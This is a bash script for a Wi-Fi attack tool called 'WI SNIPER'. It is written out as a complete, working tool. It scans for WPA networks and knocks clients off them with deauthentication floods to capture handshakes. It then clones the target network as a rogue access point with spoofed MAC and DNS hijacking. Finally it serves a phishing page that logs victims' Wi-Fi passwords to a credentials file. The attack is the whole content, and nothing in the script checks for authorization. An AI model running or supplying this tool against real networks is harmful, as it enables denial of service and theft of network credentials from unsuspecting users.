#!/bin/bash

########## WI SNIPER - Advanced Wi-Fi Security Tool ##########
########## Version: 3.0 - Enhanced Edition ##########

# Global Configuration
readonly SCRIPT_VERSION="3.0"
readonly SCRIPT_REVISION="12"
readonly SCRIPT_NAME="WI SNIPER"
readonly SCRIPT_AUTHOR="WI SNIPER Team"

# Debug Mode Configuration
FLUX_DEBUG="${FLUX_DEBUG:-0}"
KEEP_NETWORK="${KEEP_NETWORK:-0}"
FLUX_AUTO="${FLUX_AUTO:-0}"

# Path Configuration
readonly BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
readonly DUMP_PATH="/tmp/wisniper"
readonly HANDSHAKE_PATH="/root/wisniper/handshakes"
readonly PASSLOG_PATH="/root/wisniper/passwords"
readonly LOG_PATH="/root/wisniper/logs"
readonly CERT_PATH="$DUMP_PATH/certs"

# Network Configuration
readonly GATEWAY_IP="192.168.1.1"
readonly SUBNET="192.168.1"
readonly DEAUTH_TIMEOUT="0"  # 0 = unlimited

# Color Definitions
readonly RED='\033[1;31m'
readonly GREEN='\033[1;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[1;34m'
readonly PURPLE='\033[0;35m'
readonly CYAN='\033[0;36m'
readonly WHITE='\033[1;37m'
readonly GREY='\033[0;37m'
readonly NC='\033[0m'  # No Color

# Error Handling
set -euo pipefail
trap cleanup_on_exit SIGINT SIGTERM SIGHUP ERR

# Logging Function
log() {
    local level="$1"
    local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo -e "[$timestamp] [$level] $message" >> "$LOG_PATH/wisniper.log"
    [[ "$FLUX_DEBUG" == "1" ]] && echo -e "[$level] $message" >&2
}

# Cleanup Function
cleanup_on_exit() {
    log "INFO" "Cleaning up..."
    
    # Kill all processes
    pkill -f "airodump-ng" 2>/dev/null || true
    pkill -f "aireplay-ng" 2>/dev/null || true
    pkill -f "mdk3" 2>/dev/null || true
    pkill -f "hostapd" 2>/dev/null || true
    pkill -f "lighttpd" 2>/dev/null || true
    pkill -f "dhcpd" 2>/dev/null || true
    pkill -f "dnsmasq" 2>/dev/null || true
    
    # Stop monitor mode
    if [[ -n "${MONITOR_INTERFACE:-}" ]] && iw dev "$MONITOR_INTERFACE" info &>/dev/null; then
        airmon-ng stop "$MONITOR_INTERFACE" &>/dev/null || true
    fi
    
    # Restore network services
    if [[ "$KEEP_NETWORK" == "0" ]]; then
        systemctl restart NetworkManager 2>/dev/null || true
        systemctl restart networking 2>/dev/null || true
    fi
    
    # Clear iptables
    iptables --flush 2>/dev/null || true
    iptables --table nat --flush 2>/dev/null || true
    
    log "INFO" "Cleanup completed"
    echo -e "${GREEN}Cleanup completed successfully!${NC}"
}

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}Error: This script must be run as root!${NC}"
        exit 1
    fi
}

# Check for X session
check_x_session() {
    if [[ -z "${DISPLAY:-}" ]] && [[ "$FLUX_AUTO" != "1" ]]; then
        echo -e "${RED}Error: This script requires a graphical session!${NC}"
        echo -e "${YELLOW}Tip: Run with FLUX_AUTO=1 for headless mode${NC}"
        exit 1
    fi
}

# Create necessary directories
setup_directories() {
    local dirs=("$DUMP_PATH" "$HANDSHAKE_PATH" "$PASSLOG_PATH" "$LOG_PATH" "$CERT_PATH")
    for dir in "${dirs[@]}"; do
        mkdir -p "$dir" 2>/dev/null || {
            echo -e "${RED}Failed to create directory: $dir${NC}"
            exit 1
        }
        chmod 755 "$dir"
    done
    log "INFO" "Directories created successfully"
}

# Check dependencies with improved detection
check_dependencies() {
    local missing_deps=()
    local dependencies=(
        "aircrack-ng:aircrack-ng"
        "aireplay-ng:aircrack-ng"
        "airodump-ng:aircrack-ng"
        "airmon-ng:aircrack-ng"
        "hostapd:hostapd"
        "dnsmasq:dnsmasq"
        "php-cgi:php-cgi"
        "lighttpd:lighttpd"
        "macchanger:macchanger"
        "mdk3:mdk3"
        "nmap:nmap"
        "xterm:xterm"
        "openssl:openssl"
        "rfkill:rfkill"
        "iw:iw"
        "curl:curl"
        "unzip:unzip"
        "awk:gawk"
    )
    
    echo -e "${BLUE}Checking dependencies...${NC}"
    for dep in "${dependencies[@]}"; do
        local cmd="${dep%%:*}"
        local pkg="${dep##*:}"
        if ! command -v "$cmd" &>/dev/null; then
            missing_deps+=("$pkg")
            echo -e "  ${RED}✗ $cmd (missing)${NC}"
        else
            echo -e "  ${GREEN}✓ $cmd${NC}"
        fi
    done
    
    if [[ ${#missing_deps[@]} -gt 0 ]]; then
        echo -e "\n${RED}Missing dependencies: ${missing_deps[*]}${NC}"
        echo -e "${YELLOW}Install with: apt-get install ${missing_deps[*]}${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}All dependencies satisfied!${NC}\n"
    sleep 2
}

# Display banner
show_banner() {
    clear
    echo -e "${RED}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║${NC}                                                          ${RED}║${NC}"
    echo -e "${RED}║${NC}  ${RED}██╗    ██╗██╗    ${WHITE}███████╗███╗   ██╗██╗██████╗ ███████╗${RED}  ║${NC}"
    echo -e "${RED}║${NC}  ${RED}██║    ██║██║    ${WHITE}██╔════╝████╗  ██║██║██╔══██╗██╔════╝${RED}  ║${NC}"
    echo -e "${RED}║${NC}  ${RED}██║ █╗ ██║██║    ${WHITE}███████╗██╔██╗ ██║██║██████╔╝█████╗  ${RED}  ║${NC}"
    echo -e "${RED}║${NC}  ${RED}██║███╗██║██║    ${WHITE}╚════██║██║╚██╗██║██║██╔═══╝ ██╔══╝  ${RED}  ║${NC}"
    echo -e "${RED}║${NC}  ${RED}╚███╔███╔╝██║    ${WHITE}███████║██║ ╚████║██║██║     ███████╗${RED}  ║${NC}"
    echo -e "${RED}║${NC}  ${RED} ╚══╝╚══╝ ╚═╝    ${WHITE}╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚══════╝${RED}  ║${NC}"
    echo -e "${RED}║${NC}                                                          ${RED}║${NC}"
    echo -e "${RED}║${NC}        ${WHITE}Advanced Wi-Fi Security Testing Tool${NC}                ${RED}║${NC}"
    echo -e "${RED}║${NC}        ${GREY}Version: ${WHITE}$SCRIPT_VERSION${GREY} (Rev: ${WHITE}$SCRIPT_REVISION${GREY})${NC}                    ${RED}║${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════════════════╝${NC}"
    echo
}

# Select wireless interface with improved detection
select_interface() {
    echo -e "${BLUE}Detecting wireless interfaces...${NC}"
    
    # Unblock all RF interfaces
    rfkill unblock all
    
    # Get list of wireless interfaces
    local interfaces=()
    while IFS= read -r line; do
        interfaces+=("$line")
    done < <(iw dev 2>/dev/null | grep Interface | awk '{print $2}')
    
    if [[ ${#interfaces[@]} -eq 0 ]]; then
        echo -e "${RED}No wireless interfaces found!${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}Found ${#interfaces[@]} wireless interface(s):${NC}"
    for i in "${!interfaces[@]}"; do
        local iface="${interfaces[$i]}"
        local driver=$(ethtool -i "$iface" 2>/dev/null | grep driver | awk '{print $2}' || echo "unknown")
        echo -e "  ${YELLOW}[$((i+1))]${NC} $iface ${GREY}($driver)${NC}"
    done
    
    if [[ "$FLUX_AUTO" == "1" ]]; then
        INTERFACE="${interfaces[0]}"
    else
        echo -ne "\n${YELLOW}Select interface [1-${#interfaces[@]}]: ${NC}"
        read -r choice
        INTERFACE="${interfaces[$((choice-1))]}"
    fi
    
    echo -e "${GREEN}Selected: $INTERFACE${NC}"
    
    # Kill interfering processes
    airmon-ng check kill &>/dev/null || true
    
    # Start monitor mode
    echo -e "${BLUE}Starting monitor mode...${NC}"
    MONITOR_INTERFACE=$(airmon-ng start "$INTERFACE" 2>/dev/null | grep "monitor mode enabled" | awk '{print $NF}' | tr -d ')' | tr -d '(')
    
    if [[ -z "$MONITOR_INTERFACE" ]]; then
        echo -e "${RED}Failed to enable monitor mode!${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}Monitor mode enabled on: $MONITOR_INTERFACE${NC}\n"
    sleep 2
}

# Scan for networks with enhanced features
scan_networks() {
    local channel="${1:-all}"
    
    echo -e "${BLUE}Scanning for networks...${NC}"
    rm -f "$DUMP_PATH/scan"*
    
    local scan_cmd="airodump-ng --band abg -w $DUMP_PATH/scan --output-format csv -a $MONITOR_INTERFACE"
    
    if [[ "$channel" != "all" ]]; then
        scan_cmd="$scan_cmd --channel $channel"
        echo -e "${YELLOW}Scanning channel: $channel${NC}"
    fi
    
    if [[ "$FLUX_AUTO" == "1" ]]; then
        timeout 60 $scan_cmd &>/dev/null &
        scan_pid=$!
        sleep 30
        kill $scan_pid 2>/dev/null || true
    else
        xterm -title "WI SNIPER - Network Scanner" -geometry 120x35 -bg black -fg white -e "$scan_cmd" &
        scan_xterm=$!
        echo -e "${YELLOW}Press ENTER when scan is complete...${NC}"
        read -r
        kill $scan_xterm 2>/dev/null || true
    fi
    
    # Parse CSV file
    local csv_file="$DUMP_PATH/scan-01.csv"
    if [[ ! -f "$csv_file" ]]; then
        echo -e "${RED}Scan failed! No data captured.${NC}"
        return 1
    fi
    
    # Extract APs from CSV
    local aps=()
    while IFS=, read -r mac fts lts channel speed privacy cipher auth power beacon iv lan ip length essid key; do
        if [[ "$mac" =~ ([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2} ]] && [[ "$privacy" == *"WPA"* ]]; then
            power=$((power + 100))
            aps+=("$mac|$channel|$privacy|$power|$essid")
        fi
    done < <(grep -E "^[0-9A-Fa-f]{2}:" "$csv_file" 2>/dev/null || true)
    
    if [[ ${#aps[@]} -eq 0 ]]; then
        echo -e "${RED}No WPA/WPA2 networks found!${NC}"
        return 1
    fi
    
    echo -e "\n${GREEN}Available Networks:${NC}"
    echo -e "${YELLOW}ID  |  CH  |  PWR  |  ENC      |  ESSID${NC}"
    echo -e "${GREY}----+------+-------+-----------+------------------${NC}"
    
    for i in "${!aps[@]}"; do
        IFS='|' read -r mac channel privacy power essid <<< "${aps[$i]}"
        printf "${WHITE}%3d${NC} | ${GREEN}%4s${NC} | ${YELLOW}%5s${NC}%% | ${BLUE}%-9s${NC} | ${CYAN}%s${NC}\n" \
            $((i+1)) "$channel" "$power" "$privacy" "$essid"
    done
    
    if [[ "$FLUX_AUTO" == "1" ]]; then
        SELECTED_AP="${aps[0]}"
    else
        echo -ne "\n${YELLOW}Select target network [1-${#aps[@]}]: ${NC}"
        read -r choice
        SELECTED_AP="${aps[$((choice-1))]}"
    fi
    
    IFS='|' read -r TARGET_MAC TARGET_CHANNEL TARGET_ENC TARGET_POWER TARGET_SSID <<< "$SELECTED_AP"
    
    echo -e "\n${GREEN}Target selected:${NC}"
    echo -e "  ${WHITE}SSID:${NC} $TARGET_SSID"
    echo -e "  ${WHITE}BSSID:${NC} $TARGET_MAC"
    echo -e "  ${WHITE}Channel:${NC} $TARGET_CHANNEL"
    echo -e "  ${WHITE}Encryption:${NC} $TARGET_ENC"
    echo -e "  ${WHITE}Signal:${NC} $TARGET_POWER%"
    
    # Get vendor info
    local vendor_prefix=$(echo "$TARGET_MAC" | cut -d: -f1-3 | tr '[:upper:]' '[:lower:]')
    local vendor=$(macchanger -l 2>/dev/null | grep -i "$vendor_prefix" | head -1 | cut -d' ' -f5- || echo "Unknown")
    echo -e "  ${WHITE}Vendor:${NC} $vendor\n"
    
    sleep 3
}

# Capture handshake with multiple methods
capture_handshake() {
    echo -e "${BLUE}Starting handshake capture...${NC}"
    
    # Set channel
    iw dev "$MONITOR_INTERFACE" set channel "$TARGET_CHANNEL"
    
    # Start capture
    airodump-ng --bssid "$TARGET_MAC" -c "$TARGET_CHANNEL" -w "$DUMP_PATH/handshake" \
        --output-format cap,csv "$MONITOR_INTERFACE" &>/dev/null &
    capture_pid=$!
    
    echo -e "${YELLOW}Choose deauth method:${NC}"
    echo -e "  ${GREEN}[1]${NC} Standard (aireplay-ng)"
    echo -e "  ${GREEN}[2]${NC} Aggressive (mdk3)"
    echo -e "  ${GREEN}[3]${NC} Targeted client"
    
    local method="1"
    [[ "$FLUX_AUTO" != "1" ]] && read -r method
    
    case $method in
        1)
            echo -e "${YELLOW}Sending deauth packets to all clients...${NC}"
            aireplay-ng --deauth 10 -a "$TARGET_MAC" "$MONITOR_INTERFACE" &>/dev/null &
            deauth_pid=$!
            ;;
        2)
            echo -e "${YELLOW}Using mdk3 for aggressive deauth...${NC}"
            echo "$TARGET_MAC" > "$DUMP_PATH/mdk3_target.txt"
            mdk3 "$MONITOR_INTERFACE" d -b "$DUMP_PATH/mdk3_target.txt" -c "$TARGET_CHANNEL" &>/dev/null &
            deauth_pid=$!
            ;;
        3)
            # Scan for clients
            echo -e "${YELLOW}Scanning for clients...${NC}"
            timeout 30 airodump-ng --bssid "$TARGET_MAC" -c "$TARGET_CHANNEL" "$MONITOR_INTERFACE" 2>/dev/null | \
                grep -E "^[0-9A-Fa-f]{2}:" | awk '{print $1}' | tail -n +2 > "$DUMP_PATH/clients.txt"
            
            if [[ -s "$DUMP_PATH/clients.txt" ]]; then
                echo -e "${GREEN}Found clients:${NC}"
                cat "$DUMP_PATH/clients.txt"
                echo -ne "${YELLOW}Enter client MAC to target: ${NC}"
                read -r client_mac
                aireplay-ng --deauth 10 -a "$TARGET_MAC" -c "$client_mac" "$MONITOR_INTERFACE" &>/dev/null &
                deauth_pid=$!
            else
                echo -e "${RED}No clients found, using broadcast deauth${NC}"
                aireplay-ng --deauth 10 -a "$TARGET_MAC" "$MONITOR_INTERFACE" &>/dev/null &
                deauth_pid=$!
            fi
            ;;
    esac
    
    echo -e "${YELLOW}Waiting for handshake...${NC}"
    
    # Monitor for handshake
    local timeout=120
    local elapsed=0
    while [[ $elapsed -lt $timeout ]]; do
        if aircrack-ng "$DUMP_PATH/handshake-01.cap" 2>/dev/null | grep -q "1 handshake"; then
            echo -e "${GREEN}Handshake captured successfully!${NC}"
            
            # Clean and save handshake
            wpaclean "$HANDSHAKE_PATH/${TARGET_SSID// /_}-$TARGET_MAC.cap" "$DUMP_PATH/handshake-01.cap" &>/dev/null
            kill $capture_pid $deauth_pid 2>/dev/null || true
            return 0
        fi
        sleep 2
        elapsed=$((elapsed + 2))
        echo -ne "\r${YELLOW}Elapsed: ${elapsed}s / ${timeout}s${NC}     "
    done
    
    echo -e "\n${RED}Handshake capture failed!${NC}"
    kill $capture_pid $deauth_pid 2>/dev/null || true
    return 1
}

# Create SSL certificate
create_certificate() {
    echo -e "${BLUE}Creating SSL certificate...${NC}"
    
    openssl req -subj '/CN=*.wisniper.local/O=WI SNIPER/C=US' -new -newkey rsa:2048 -days 365 -nodes \
        -x509 -keyout "$CERT_PATH/server.key" -out "$CERT_PATH/server.crt" &>/dev/null
    
    cat "$CERT_PATH/server.crt" "$CERT_PATH/server.key" > "$CERT_PATH/server.pem"
    chmod 400 "$CERT_PATH/server.pem"
    
    echo -e "${GREEN}SSL certificate created${NC}"
}

# Setup rogue AP
setup_rogue_ap() {
    echo -e "${BLUE}Setting up rogue access point...${NC}"
    
    # Stop conflicting services
    systemctl stop NetworkManager 2>/dev/null || true
    systemctl stop dnsmasq 2>/dev/null || true
    
    # Configure hostapd
    cat > "$DUMP_PATH/hostapd.conf" <<EOF
interface=$INTERFACE
driver=nl80211
ssid=$TARGET_SSID
channel=$TARGET_CHANNEL
hw_mode=g
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=wisniper_temp
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
EOF
    
    # Configure dnsmasq
    cat > "$DUMP_PATH/dnsmasq.conf" <<EOF
interface=$INTERFACE
dhcp-range=$SUBNET.100,$SUBNET.250,255.255.255.0,12h
dhcp-option=3,$GATEWAY_IP
dhcp-option=6,$GATEWAY_IP
server=8.8.8.8
server=8.8.4.4
address=/#/$GATEWAY_IP
EOF
    
    # Setup interface
    ifconfig "$INTERFACE" down 2>/dev/null || true
    macchanger -m "$TARGET_MAC" "$INTERFACE" &>/dev/null || true
    ifconfig "$INTERFACE" up "$GATEWAY_IP" netmask 255.255.255.0
    
    # Start services
    hostapd "$DUMP_PATH/hostapd.conf" &>/dev/null &
    dnsmasq -C "$DUMP_PATH/dnsmasq.conf" -d &>/dev/null &
    
    echo -e "${GREEN}Rogue AP setup complete${NC}"
}

# Setup phishing page
setup_phishing_page() {
    echo -e "${BLUE}Setting up phishing page...${NC}"
    
    local site_dir="$DUMP_PATH/www"
    mkdir -p "$site_dir"
    
    # Create index page
    cat > "$site_dir/index.html" <<'EOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wi-Fi Authentication</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            padding: 40px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .wifi-icon {
            font-size: 48px;
            margin-bottom: 20px;
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }
        .network-name {
            background: #f5f5f5;
            padding: 10px;
            border-radius: 10px;
            margin: 20px 0;
            font-family: monospace;
            color: #667eea;
        }
        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
        }
        .error {
            color: #e74c3c;
            margin-top: 10px;
            display: none;
        }
        .success {
            color: #27ae60;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="wifi-icon">📶</div>
        <h1>Wi-Fi Network Authentication</h1>
        <p>Please authenticate to continue using the network</p>
        <div class="network-name" id="networkName"></div>
        <form id="authForm">
            <input type="password" id="password" placeholder="Enter Wi-Fi password" required>
            <button type="submit">Connect</button>
        </form>
        <div class="error" id="errorMsg">Invalid password. Please try again.</div>
        <div class="success" id="successMsg">Authenticating...</div>
    </div>
    
    <script>
        // Get network name from URL or use default
        const urlParams = new URLSearchParams(window.location.search);
        const networkName = urlParams.get('ssid') || 'Wi-Fi Network';
        document.getElementById('networkName').textContent = networkName;
        
        document.getElementById('authForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const password = document.getElementById('password').value;
            const errorDiv = document.getElementById('errorMsg');
            const successDiv = document.getElementById('successMsg');
            
            if (!password) {
                errorDiv.style.display = 'block';
                successDiv.style.display = 'none';
                return;
            }
            
            errorDiv.style.display = 'none';
            successDiv.style.display = 'block';
            
            // Send password to server
            try {
                const response = await fetch('/capture.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: 'password=' + encodeURIComponent(password)
                });
                
                const result = await response.text();
                if (result === 'success') {
                    successDiv.textContent = 'Authentication successful! Redirecting...';
                    setTimeout(() => {
                        window.location.href = 'http://www.google.com';
                    }, 2000);
                } else {
                    successDiv.style.display = 'none';
                    errorDiv.style.display = 'block';
                }
            } catch (err) {
                successDiv.style.display = 'none';
                errorDiv.style.display = 'block';
            }
        });
    </script>
</body>
</html>
EOF
    
    # Create PHP capture script
    cat > "$site_dir/capture.php" <<EOF
<?php
\$password = \$_POST['password'] ?? '';
\$timestamp = date('Y-m-d H:i:s');
\$network = '${TARGET_SSID}';
\$bssid = '${TARGET_MAC}';

if (!empty(\$password)) {
    \$log_entry = "[$timestamp] Network: \$network (BSSID: \$bssid) | Password: \$password\n";
    file_put_contents('$PASSLOG_PATH/credentials.log', \$log_entry, FILE_APPEND);
    
    // Also save to individual network file
    \$network_file = '$PASSLOG_PATH/${TARGET_SSID// /_}-$TARGET_MAC.txt';
    file_put_contents(\$network_file, \$log_entry, FILE_APPEND);
    
    echo 'success';
} else {
    echo 'error';
}
?>
EOF
    
    # Configure lighttpd
    cat > "$DUMP_PATH/lighttpd.conf" <<EOF
server.document-root = "$site_dir"
server.port = 80
server.modules = ("mod_fastcgi")
fastcgi.server = ( ".php" => ((
    "bin-path" => "/usr/bin/php-cgi",
    "socket" => "/tmp/php.socket"
)))
index-file.names = ("index.html")
mimetype.assign = (
    ".html" => "text/html",
    ".css" => "text/css",
    ".js" => "application/javascript",
    ".png" => "image/png"
)
EOF
    
    # Start web server
    lighttpd -f "$DUMP_PATH/lighttpd.conf" &>/dev/null &
    
    echo -e "${GREEN}Phishing page ready at http://$GATEWAY_IP${NC}"
}

# Start the attack
start_attack() {
    echo -e "\n${GREEN}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║${NC}              ${WHITE}ATTACK IN PROGRESS${NC}                         ${GREEN}║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════╝${NC}\n"
    
    echo -e "${BLUE}Target Information:${NC}"
    echo -e "  ${WHITE}SSID:${NC} $TARGET_SSID"
    echo -e "  ${WHITE}BSSID:${NC} $TARGET_MAC"
    echo -e "  ${WHITE}Channel:${NC} $TARGET_CHANNEL"
    echo -e "  ${WHITE}Gateway IP:${NC} $GATEWAY_IP\n"
    
    echo -e "${YELLOW}Monitoring:${NC}"
    echo -e "  ${WHITE}Handshake:${NC} $HANDSHAKE_PATH/${TARGET_SSID// /_}-$TARGET_MAC.cap"
    echo -e "  ${WHITE}Passwords:${NC} $PASSLOG_PATH/credentials.log"
    echo -e "  ${WHITE}Logs:${NC} $LOG_PATH/wisniper.log\n"
    
    echo -e "${GREEN}Waiting for victims to connect and enter passwords...${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop the attack${NC}\n"
    
    # Monitor for captured passwords
    local last_size=0
    while true; do
        if [[ -f "$PASSLOG_PATH/credentials.log" ]]; then
            local current_size=$(stat -c%s "$PASSLOG_PATH/credentials.log" 2>/dev/null || echo 0)
            if [[ $current_size -gt $last_size ]]; then
                echo -e "\n${GREEN}[+] New password captured!${NC}"
                tail -n 1 "$PASSLOG_PATH/credentials.log"
                echo -ne "\n${YELLOW}Press any key to continue monitoring...${NC}"
                read -t 1 -n 1 || true
                last_size=$current_size
            fi
        fi
        sleep 2
    done
}

# Main menu
main_menu() {
    while true; do
        show_banner
        echo -e "${BLUE}Main Menu:${NC}"
        echo -e "  ${GREEN}[1]${NC} Quick Attack (Auto-mode)"
        echo -e "  ${GREEN}[2]${NC} Custom Attack"
        echo -e "  ${GREEN}[3]${NC} View Captured Passwords"
        echo -e "  ${GREEN}[4]${NC} View Handshakes"
        echo -e "  ${GREEN}[5]${NC} Cleanup"
        echo -e "  ${RED}[6]${NC} Exit"
        echo
        echo -ne "${YELLOW}Choose an option: ${NC}"
        read -r choice
        
        case $choice in
            1)
                FLUX_AUTO=1
                setup_directories
                select_interface
                scan_networks
                if capture_handshake; then
                    create_certificate
                    setup_rogue_ap
                    setup_phishing_page
                    start_attack
                fi
                ;;
            2)
                FLUX_AUTO=0
                setup_directories
                select_interface
                scan_networks
                if capture_handshake; then
                    create_certificate
                    setup_rogue_ap
                    setup_phishing_page
                    start_attack
                fi
                ;;
            3)
                if [[ -f "$PASSLOG_PATH/credentials.log" ]]; then
                    less "$PASSLOG_PATH/credentials.log"
                else
                    echo -e "${RED}No passwords captured yet.${NC}"
                    sleep 2
                fi
                ;;
            4)
                if ls "$HANDSHAKE_PATH"/*.cap &>/dev/null; then
                    ls -lh "$HANDSHAKE_PATH"/*.cap
                    echo -ne "\n${YELLOW}Analyze handshake? (y/N): ${NC}"
                    read -r analyze
                    if [[ "$analyze" =~ ^[Yy]$ ]]; then
                        echo -ne "Enter handshake file path: "
                        read -r handshake_file
                        aircrack-ng "$handshake_file"
                    fi
                else
                    echo -e "${RED}No handshakes captured yet.${NC}"
                fi
                sleep 2
                ;;
            5)
                cleanup_on_exit
                echo -e "${GREEN}Cleanup complete!${NC}"
                sleep 2
                ;;
            6)
                cleanup_on_exit
                echo -e "${GREEN}Goodbye!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid option!${NC}"
                sleep 1
                ;;
        esac
    done
}

# Main execution
main() {
    check_root
    check_x_session
    check_dependencies
    main_menu
}

# Run main function
main "$@"
